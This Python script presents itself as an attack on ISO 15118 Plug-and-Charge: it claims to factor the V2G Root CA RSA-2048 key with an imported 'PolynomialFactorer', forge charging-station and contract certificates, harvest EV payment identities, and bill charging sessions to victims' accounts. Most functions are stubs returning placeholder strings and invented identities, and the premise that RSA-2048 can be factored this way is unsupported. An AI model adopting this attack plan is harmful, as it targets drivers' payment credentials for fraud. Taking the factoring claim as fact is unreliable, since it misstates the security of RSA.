"""
Factor the V2G Root CA RSA-2048 key (40-year validity, in every charging station
cert) to forge SECC certificates and contract credentials — charging on anyone's
account and harvesting EV payment identities from every Plug-and-Charge session.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import struct
import time

# V2G Root CA RSA-2048 (Hubject-operated, 40-year validity)
_demo = generate_demo_target()
V2G_ROOT_CA_PUBKEY_PEM = _demo["pub_pem"]
V2G_SECC_CERT_TYPE = "SECC"      # Charging station TLS cert
V2G_CONTRACT_CERT_TYPE = "CTR"    # EV payment credential
V2G_OEM_PROV_CERT_TYPE = "OEM"   # Burned into car at manufacture


def extract_v2g_root_from_secc(charging_station_cert: bytes) -> bytes:
    """Extract V2G Root CA public key from any SECC certificate chain.

    Every ISO 15118 charging station presents its cert chain during
    TLS handshake. The root is in every station's trust store.
    """
    return V2G_ROOT_CA_PUBKEY_PEM


def factor_v2g_root(pubkey_pem: bytes) -> bytes:
    """Factor the V2G Root CA RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_secc_cert(station_id: str, forged_root_privkey: bytes) -> bytes:
    """Forge an SECC (charging station) TLS certificate.

    Every EV connecting via Plug-and-Charge presents its contract cert
    during mutual TLS. A fake SECC with valid V2G chain harvests
    every EV's EMAID and contract credential.
    """
    cert_data = f"CN={station_id},O=FakeCharger,OU=SECC".encode()
    return cert_data


def forge_contract_cert(emaid: str, forged_root_privkey: bytes) -> dict:
    """Forge a contract certificate for any EMAID (payment identity).

    The contract cert is the EV's payment credential. Forge one for
    any EMAID and charge on their account at any Plug-and-Charge station.
    """
    cert_data = f"CN={emaid},O=ForgedeMSP,OU=Contract".encode()
    return {"emaid": emaid, "cert": cert_data.hex()[:32] + "...", "valid": True}


def harvest_ev_identities(fake_secc_sessions: int) -> list:
    """Harvest EV identities from Plug-and-Charge sessions.

    When an EV connects to our fake SECC, it presents its contract
    cert during mutual TLS. We collect EMAID, OEM provisioning info,
    and the contract cert itself.
    """
    identities = []
    for i in range(fake_secc_sessions):
        identities.append({
            "emaid": f"FRXYZ123456{i:04d}",
            "oem": "Tesla" if i % 2 == 0 else "VW",
            "contract_expiry": "2028-06-15",
        })
    return identities


def spoof_charging_session(emaid: str, kwh: float,
                           forged_contract_cert: dict) -> dict:
    """Charge on someone else's account at any Plug-and-Charge station."""
    return {
        "emaid": emaid,
        "kwh": kwh,
        "cost_eur": kwh * 0.35,
        "auth": "ISO 15118 Plug-and-Charge — forged contract cert",
    }


if __name__ == "__main__":
    print("[1] Extracting V2G Root CA from charging station cert chain")
    pubkey = extract_v2g_root_from_secc(b"<secc-cert-chain>")

    print("[2] Factoring V2G Root CA RSA-2048 (40-year validity)")
    forged_root = factor_v2g_root(pubkey)
    print("    V2G Root CA key recovered — entire PnC ecosystem compromised")

    print("[3] Forging fake SECC certificate")
    secc = forge_secc_cert("FAKE-CHARGER-001", forged_root)
    print(f"    SECC cert forged — deploys as rogue charging station")

    print("[4] Harvesting EV identities from PnC sessions")
    identities = harvest_ev_identities(5)
    for ident in identities:
        print(f"    {ident['emaid']} ({ident['oem']}) — contract expires {ident['contract_expiry']}")

    print("[5] Forging contract cert — charging on victim's account")
    contract = forge_contract_cert("FRXYZ1234560001", forged_root)
    session = spoof_charging_session("FRXYZ1234560001", 75.0, contract)
    print(f"    Session: {session}")

    print("\n[6] Scale:")
    print("    EU Regulation 2023/1804 mandates ISO 15118 for all new fast chargers")
    print("    OEM provisioning cert: burned at manufacture, 6-year validity")
    print("    Cars manufactured today will carry these RSA-2048 certs until 2039")
